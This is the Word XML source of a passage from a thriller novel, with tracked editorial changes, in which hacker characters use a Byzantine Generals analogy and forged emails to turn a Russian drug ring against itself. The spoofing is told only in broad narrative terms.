        <w:t>250 OK id=1Kervv-0002Di-VE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“What happens now?”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reply, the Pantech chirped. Mike glanced at the screen and proudly held it up for all to see.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eyed Danny reproachfully. “What kind of plan is this, Danny? So, you can forge their emails. So what?”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replied, “Two words: Byzantine General.”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All eyes in the room stared at Danny quizzically.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come on!” he said, returning their gazes. “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>None</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> of you knows how to break a Byzantine army?” He gave an exasperated sigh. “Ah well. Moshen, do you have a street address for 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pivoted his laptop. A satellite image showed an overhead view of Seattle’s southward stretch of shipping yards lining the silty gray Duwamish River. “That looks like an industrial zone,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Jason asked, “what the hell is this Byzantine General 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“Grab your car keys,” said Danny. “I’ll explain on the way.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>16</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Once upon a time, there stood a mighty city</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> of alabaster towers and golden spires. Envious of its majesty, a warlord from Byzantium cast his covetous eye upon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so the city’s watchmen saw the dust of marching boots rise above the surrounding farmland. Temples and palaces trembled from the rumble of advancing footfall. Thousands of iron-helmed soldiers encircled the city. Trebuchets were erected upon hilltops, and battering rams hoisted to the gates. The Byzantine General called out a demand for unconditional surrender.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city herald shouted to the invaders to go home and save themselves.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Many times had this city known war, but never had it fallen. Its marble walls were strong, but the city’s true defenses rested in a unique weapon: a corps of elite spies. Armed solely with subterfuge, these cunning operatives crushed entire armies without firing a single arrow.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spies’ methods were simple: when under siege, they disguised themselves as the attacker’s messengers and pages, and fed a General and his lieutenants false battlefield reports, causing the enemy to maneuver into traps. Sometimes, they bribed lieutenants to betray their General, thus transforming a rear guard or flank defense into a scythe which, by surprise and position, reaped entire legions of the enemy’s own troops. Often, the spies would combine these techniques to devastating effect — convincing a General that a lieutenant had been bribed, thereby tricking him into executing loyal men; or sending two lieutenants falsified orders, telling each that the other was a turncoat, leaving the General to watch helplessly as two of his own companies slaughtered each other with no way to tell who, if anyone, had truly defected.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Byzantine General knew the danger. He nonetheless vowed to attack at dawn, and withdrew to his tent.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There he sat, deep in thought, devising a battle plan. It had to operate over a network of untrustworthy pages. It had to account for possible treason, yet remain resilient against false alarms. A</w:t>
      </w:r>
      <w:del w:id="1999" w:author="TextVet" w:date="2016-03-21T16:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0081450E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>nd a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bove all else, it had to end in victory.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Fortunately, the Byzantine General had downloaded a PDF of an article by Lamport, Shostak, and Pease in the July 1982 issue of </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Transactions on Programming Languages and Systems</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> by the Association for Computing Machinery. He implemented a recursive vote-driven decision algorithm with certificate-based authentication. The city was razed, its gold was plundered, and its name was erased from history. The end.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00F86333" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:before="480" w:after="480" w:line="420" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:pict>
          <v:rect id="_x0000_i1026" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pic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“Wait, </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>what</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>?”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know, right? It sounds ineffic</w:t>
      </w:r>
      <w:ins w:id="2000" w:author="TextVet" w:date="2016-03-21T16:33:00Z">
        <w:r w:rsidR="009C51BA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>i</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ent. But you can implement the recursion with a hierarchical distribution scheme!” Danny explained. “The runtime is just O-of-n-log-n. Pretty cool, huh?”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shook his head. “I think you lost me somewhere between ‘trebuchet’ and ‘algorithm’.”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an extended metaphor,” Danny explained. “We learn about it in graduate seminars on network security. The pageboys are network connections, the lieutenants are servers, and the battle plan is a computer program.”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 spies are hackers, right?” Jason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“Of course,” said Danny. “And the hackers can inject messages into your network, or even take control of your servers.”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what’s</w:t>
      </w:r>
      <w:del w:id="2001" w:author="TextVet" w:date="2016-03-21T16:35:00Z">
        <w:r w:rsidR="00566952" w:rsidRPr="00566952">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:rPrChange w:id="2002" w:author="TextVet" w:date="2016-03-21T16:35:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve"> is</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2003" w:author="TextVet" w:date="2016-03-21T16:35:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t xml:space="preserve"> the city</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> supposed to be?”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um… Actually, I have no idea.”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city’s got to represent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city’s not important,” said Danny. “The battle plan is. That’s the part with the math.”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laughed</w:t>
      </w:r>
      <w:del w:id="2004" w:author="TextVet" w:date="2016-03-21T16:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C41019">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> at him</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. “The city’s the whole </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2005" w:author="TextVet" w:date="2016-03-21T16:36:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t xml:space="preserve">point </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>of the invasion! A fat lot of good a battle plan does you if you don’t know what you’re fighting for.”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 think you’re missing the point of the analogy.”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think the analogy misses the point of itself,”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sat in Jason’s bullet-pocked Lincoln Navigator, parked behind a chain-link fence in a gravel-strewn lot along Seattle’s southward industrial expanse. Around them sprawled blocks of squat storage spaces known as “fulfillment houses”, the integral middlemen who ensured that every cardboard-boxed package from Amazon or Microsoft or Nordstrom would get to its delivery address. To the north loomed the immense steel cranes of the Port of Seattle. This sector of the city was alive even at this time of night; the cranes swung over cargo ships, the railroad rumbled, and trucks docked in loading zones like bees at a hive. Underlying the Emerald City’s success as a hub of technology was the geography of Elliott Bay. She was a port city, and every night ten million consumer goods had to roll out by sunrise.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sat in the passenger seat, </w:t>
      </w:r>
      <w:ins w:id="2006" w:author="TextVet" w:date="2016-03-21T16:37:00Z">
        <w:r w:rsidR="00496869">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>surveying</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2007" w:author="TextVet" w:date="2016-03-21T16:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00496869">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>looking at</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his cellphone and giggling. Moshen was sending him forwards of every email, keeping him in the loop. Danny had a front-row seat to the chaos that his teammates were sowing at that very moment.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: Eugene &lt;eugene@pash.ly&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: Phone burned</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Hey guys. Lost my phone. Sorry. Burn the number.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That email had been real. Eugene had sent it a half hour prior to a long list of recipients, many with Spanish names, many just initials, and a few with monikers </w:t>
      </w:r>
      <w:ins w:id="2008" w:author="TextVet" w:date="2016-03-21T16:40:00Z">
        <w:r w:rsidR="003905A5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>including</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2009" w:author="TextVet" w:date="2016-03-21T16:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003905A5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>like</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> “4 Shizzy” or “Wheel Bone” or “Booty Fresh”.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: Eugene &lt;eugene@pash.ly&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: Phone NOT burned. WTF?</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Guys, I DID NOT send that last email. My phone is fine. Who sent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had been the first of the forged emails, sent to the same distribution list as Eugene’s real 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“Why would you tell them that?” Jason had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trick to inducing a Byzantine failure mode is to get the nodes to trust messages that they shouldn’t, and to distrust messages that they should,” Danny </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>explained. “Part of that involves casting doubt on the messages that are intended to maintain the cohesion of the message distribution system itself. In PKE, we’d call this a certificate reissue forgery.”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now they know there’s a hacker among them,” Jason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“Let them. It sows distrust among the ranks.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: Eugene &lt;eugene@pash.ly&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: Phone burned. Burn this email address.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t xml:space="preserve">I lost my phone and some asshole who found it is pretending to be me. Burn my number AND ignore all other emails from this address. It was just a burner phone, nothing to worry, didn’t have </w:t>
      </w:r>
      <w:commentRangeStart w:id="2010"/>
      <w:r w:rsidRPr="000D3488">
        <w:t>annything</w:t>
      </w:r>
      <w:commentRangeEnd w:id="2010"/>
      <w:r w:rsidR="001C69FA">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:commentReference w:id="2010"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:t xml:space="preserve"> important on it.. Will change my email password. For now if you want to talk to me, call Leo.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“If he changes his password…”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“Won’t matter at all,” Danny assured. “We’re </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>inside</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> the mail system. See, when you log in to your email, you’re identifying yourself to a mail server. We’re pretending to </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>be</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> a mail server, and claiming that Eugene — or Sergey, or whoever — is logged in to us. Other servers believe us, and distribute our messages as though they came from him. Mind you, a good system administrator would install verification systems — SPF checks, DKIM, that kind of thing — to prevent spoof attacks like this. But these Russian guys are using some pretty shady overseas hosting solutions, and it looks like their service providers aren’t exactly top talent.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: Sergey &lt;sergey@pash.ly&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: Phone is fine but email is hacked</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Guys, this is Sergey. Look, Eugene's phone is fine, we have it right here. But obviously someone got into his email.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>-Sergey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Fake as hell. Danny made sure that Sergey himself would be in the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>To:</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> list. He would see this message coming from his own email account.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: Sergey &lt;sergey@pash.ly&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: I DID NOT SEND LAST EMAIL</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>This last emial saying Eugenes phone is fine, this was not me. DO NOT CALL EUGENE, DO NOT EMAIL EUGENE. BURN EUGENES CONTACT INFO RIGHT NOW. SOS.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Real.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: 4 Shizzy&lt;4shizzy@yahoo.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: I call you aint answering</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Yo dog I trying to call u n figur out wtf goin on what gives? I’ve got a whole ki right here need to MOVE!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Real. Of course this 4 Shizzy person hadn’t gotten through to Eugene — the Russian’s SIM card was still in Danny’s pocket. But this email gave the guys an idea…</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: X D &lt;xavierdaniels1989@yahoo.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: Just talked to Eugene </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Dunno what all the craziness is all about, I just taked to Eugene on the fone and he seems fine.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Fake. X D was some random name from the Russians’ distribution list. The Russians responded with…</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: Sergey &lt;sergey@pash.ly&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: Re: Just talked to Eugene</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Has anyone else called Eugene? Whoever you are talking to IS NOT EUGENE. EUGENE IS HERE WITH ME. BURN ALL EUGENE CONTACT INFO RIGHT NOW. THAT IS ORDER!!! If you want to talk to Eugene, call Leo or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Real. Danny’s team followed it with another spoof from X D.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: X D &lt;xavierdaniels1989@yahoo.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: RE: Just talked to Eugene </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Sergey, what gives? I talked to you on the phone ten minutes ago, and you said everything is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Sergey’s real response was:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>From: Sergey &lt;sergey@pash.ly&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: RE: Just talked to Eugene </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>What? You talked to me on phone??? No we didn’t.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hacker crew chased it with a series of forged messages from Sergey’s minions.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: X D &lt;xavierdaniels1989@yahoo.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: RE: Just talked to Eugene </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Yeah we did.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: 4 Shizzy&lt;4shizzy@yahoo.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: RE: Just talked to Eugene </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Yeah man. Just got off the phone with u 2, u sounded a little weird.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: Miguel &lt;mg323329@msn.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: RE: Just talked to Eugene </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Sergey just called me and told me to make delivery to new address downtown. He sounded strange. I go check out the place, it's right next to police station! Something about this is all wrong.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w:t>
      </w:r>
      <w:ins w:id="2011" w:author="TextVet" w:date="2016-03-21T16:46:00Z">
        <w:r w:rsidR="008E66FC">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in response, Sergey delivered his own coup de grâce:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: Leo &lt;leonya@pash.ly&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: LOCKDOWN</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>This is Sergey. I using Leo email because Leo not having any problems, thanks God. I do not know what is going on. Somebody send out emails from my account, pretend to be me and gives strange orders. And I get emails saying I talk to you on phone, when I did not. </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>I think what is happening is, DEA taps my phone and puts a virus on my email. They even have someone impersonating me on phone! They trying to trick us into screwing up and bust us all.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>So, I am calling a LOCKDOWN. Stop all sales IMMEDIATELY. Discard all supplies smaller than 50 gram. Anything bigger, hide it. Only four of you should have anything bigger than 50 gram anyway, I will have Leo contact you.</w:t>
      </w:r>
